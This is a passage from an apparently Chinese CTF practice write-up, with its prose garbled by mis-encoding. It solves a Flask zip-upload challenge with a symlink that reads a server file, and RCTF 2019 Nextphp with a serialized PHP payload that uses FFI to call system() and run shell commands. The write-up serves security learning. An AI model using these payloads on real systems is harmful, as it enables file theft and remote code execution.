class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]: <span class="comment"># åªèƒ½ä¸Šä¼ zipæ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base): <span class="comment"># åˆ›å»ºè·¯å¾„</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>: <span class="comment"># å¦‚æœå­˜åœ¨|æˆ–è€…;</span></span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“uploadè·¯ç”±é‡Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ å¹¶ä¸”å¯¹æ–‡ä»¶è§£å‹ç¼©ä¹‹åæŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<p>è€Œshowflagè·¯ç”±é‡Œé¢ï¼Œç”±äºifæ¡ä»¶æ°¸å‡ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•é€šè¿‡è¯¥è·¯ç”±è·å–flagï¼Œä½†æ˜¯è¿™ä¸ªè·¯ç”±å‘Šè¯‰æˆ‘ä»¬flagæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„<code>./flag/flag.jpg</code></p>
<p>ä¹‹åçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼š<a href="https://blog.csdn.net/SopRomeo/article/details/108334393">å‚è€ƒ</a>è¿™é‡Œæåˆ°äº†<a href="https://www.cnblogs.com/sueyyyy/p/10985443.html">è½¯è¿æ¥çš„ä½¿ç”¨</a></p>
<p>å‘½ä»¤ï¼šï¼ˆæ³¨æ„ è¿™é‡Œçš„flagæ–‡ä»¶éœ€è¦ç»å¯¹è·¯å¾„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg test</span><br><span class="line">zip -ry test.zip test</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/d6568ca2918447169f9bdc80a110e0fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h4><ul>
<li>php FFIæ‰©å±•</li>
</ul>
<p>ä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹çœ‹phpinfoé‡Œé¢ç»™äº†æˆ‘ä»¬ä»€ä¹ˆä¿¡æ¯ï¼Œç»å…¸å¸¸ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«banäº†</p>
<p><img src="https://img-blog.csdnimg.cn/e70fbdace5f043f8b31be121c1602434.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>éšä¾¿å°è¯•ä¸€ä¸‹ï¼Œå¾ˆå¤šå‡½æ•°ä¾‹å¦‚var_dump,print_r,echo,file_get_contents,file_put_contentséƒ½æ²¡æœ‰è¢«banï¼Œè¿˜æ˜¯æœ‰æœºä¼šçš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=var_dump(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=file_get_contents(&quot;/var/www/html/preload.php&quot;);</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>$this-&gt;data[&#39;ret&#39;] = $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</code>æ¥æ‰§è¡Œå‡½æ•°ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯å¾ˆå¤šå‡½æ•°è¢«banäº†</p>
<p>è¿™é‡Œè¦ç”¨åˆ°phpçš„ä¸€ä¸ªæ‰©å±•<a href="https://www.jianshu.com/p/c1f268aaf791/">FFIæ‰©å±•</a>ï¼Œå®ƒæ”¯æŒphpè°ƒç”¨cçš„ä»£ç </p>
<p>FFI::cdef([string ![cdef = â€œâ€ <a href="https://math.jianshu.com/math?formula=cdef%20=%20%22%22%20%5B,%20string">, string</a>lib = null]]): FFI</p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI:cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char* command)&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># C%3A1%3A%22A%22%3A87%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A8%3A%22FFI%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A25%3A%22int+system%28char%2A+command%29%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=unserialize(urldecode(&#x27;C%3A1%3A%22A%22%3A89%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A26%3A%22int+system%28char+%2Acommand%29%3B%22%3B%7D%7D&#x27;))-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag&gt;/var/www/html/1.txt&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><p>ç¬¬ä¸€å‘¨ç»“æŸäº†ï¼Œæ„Ÿè§‰å­¦åˆ°çš„æ–°çŸ¥è¯†ä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œå¾ˆå¤šé‡åˆ°çš„æ–°çŸ¥è¯†éƒ½æ²¡æœ‰å½»åº•ç†è§£ï¼Œä¸‹å‘¨æ•ˆç‡è¦é«˜ä¸€ç‚¹äº†</p>
<p>~</p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>buuåˆ·é¢˜</tag>
        <tag>web</tag>
      </tags>
  </entry>
</search>
